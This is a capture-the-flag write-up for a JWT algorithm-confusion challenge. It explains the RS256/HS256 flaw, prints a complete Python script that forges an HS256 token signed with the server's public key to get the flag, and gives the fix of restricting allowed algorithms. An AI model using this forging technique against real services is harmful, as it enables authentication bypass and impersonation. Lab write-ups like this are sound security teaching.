# The Faceless Verifier - Complete Solution

## Challenge Overview
**Challenge**: The Faceless Verifier  
**Type**: JWT Algorithm Confusion Attack  
**Theme**: Game of Thrones - Faceless Men  
**Port**: `nc labs.cyberspacevr.in 30343` (was 30182 → 30113 → 30343)  
**Flag**: `SpaceCTF{valar_morghulis_face_no_man_2ZD66Q}`

## Key Clues Analysis

### From Challenge Description
- **"signed and counter-signed identities"** → Two signature algorithms (RS256 + HS256)
- **"two ways of speaking"** → Two JWT algorithms accepted
- **"A traveller may speak under either tongue"** → Either algorithm works
- **"gates open only for those who know whom they truly serve"** → Need correct NAME

### From Server Banner
- **"A girl has a name. A girl pays the iron price."**
- Reference to Arya Stark's storyline with the Faceless Men
- **"iron price"** = taking something by force/conquest (Game of Thrones lore)

### From Server Response
- **"The flag is reserved for those who walk under the names of Jaqen H'ghar or the many-faced."**
- Need name = "Jaqen H'ghar" OR "many-faced"
- **Correct name for flag**: "many-faced" (not "Jaqen H'ghar")

## The Vulnerability: JWT Algorithm Confusion

### How It Works
1. **Server signs tokens with RS256** (RSA asymmetric: signs with private key, verifies with public key)
2. **Server's verify function ALSO accepts HS256** (HMAC symmetric: same key for sign and verify)
3. **If we craft a token with alg=HS256** and sign it using the PUBLIC KEY as the HMAC secret
4. **Server will verify it successfully** because it uses that same public key for verification

This happens when developers write vulnerable code like:
```javascript
jwt.verify(token, publicKey) // without restricting allowed algorithms
```

The server trusts the 'alg' header in the token, so it switches to HMAC verification using the public key as the secret.

## Critical Discovery
**The server generates a NEW RSA key pair for each TCP connection!**

This means we must:
1. Get the public key 
2. Submit our forged token
3. **All in the SAME connection**

## Exploit Steps

### Step 1: Connect and Get Public Key
```bash
nc labs.cyberspacevr.in 30343
> pubkey
```

Extract the exact PEM format returned by the server.

### Step 2: Forge HS256 Token
Create a JWT with:
- **Header**: `{"alg":"HS256","typ":"JWT"}`
- **Payload**: `{"name":"many-faced","iat":<current_timestamp>}`
- **Signature**: HMAC-SHA256 using the public key PEM string **with trailing newline** as secret

### Step 3: Submit Token
```bash
> submit <forged_jwt_token>
```

Get the flag!

## Complete Exploit Code

```python
#!/usr/bin/env python3
import socket, json, base64, hmac, hashlib, time

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Single connection (key rotates per connection)
s = socket.socket()
s.connect(('labs.cyberspacevr.in', 30343))
s.settimeout(5)

# Skip banner
banner = s.recv(4096).decode()

# Step 1: Get public key
s.sendall(b'pubkey\n')
time.sleep(1)
resp = s.recv(4096).decode()

# Extract PEM key exactly as returned
lines = resp.split('\n')
key_lines = []
in_key = False
for line in lines:
    if '-----BEGIN' in line:
        in_key = True
    if in_key:
        key_lines.append(line)
    if '-----END' in line:
        break

exact_key = '\n'.join(key_lines)

# Step 2: Forge HS256 token with public key as HMAC secret
key = (exact_key + '\n').encode()  # trailing newline!
header = {"alg":"HS256","typ":"JWT"}
payload = {"name":"many-faced","iat":int(time.time())}

h = base64url_encode(json.dumps(header,separators=(',',':')))
p = base64url_encode(json.dumps(payload,separators=(',',':')))
signing_input = h + '.' + p

sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
sig_b64 = base64url_encode(sig)
token = signing_input + '.' + sig_b64

# Step 3: Submit
s.sendall(f'submit {token}\n'.encode())
time.sleep(1)
print(s.recv(4096).decode())
s.close()
```

## Key Takeaways

### Technical Details
1. **Never trust the 'alg' field** in a JWT header. Always enforce allowed algorithms server-side.
2. **The fix is simple** - specify algorithms explicitly:
   ```javascript
   jwt.verify(token, key, { algorithms: ['RS256'] })
   ```
3. **The per-session key rotation** was a nice twist - forces you to do everything in one connection.
4. **The correct HMAC key format** was the PEM string with a trailing newline character.
5. **The correct name** was 'many-faced' (not 'Jaqen H\'ghar' which was accepted but didn't give the flag).

### Game of Thrones Theme
- **"Iron price"** = taking by force → Use the public key as HMAC secret (taking what's available)
- **"A girl has a name"** → Focus on the name field in the JWT payload
- **"Two ways of speaking"** → RS256 vs HS256 algorithms
- **"Faceless Men"** → Identity confusion (algorithm confusion)

## References
- [PortSwigger: JWT Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [Auth0: Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)

## Final Flag
```
SpaceCTF{valar_morghulis_face_no_man_2ZD66Q}
```

**Challenge Status**: ✅ SOLVED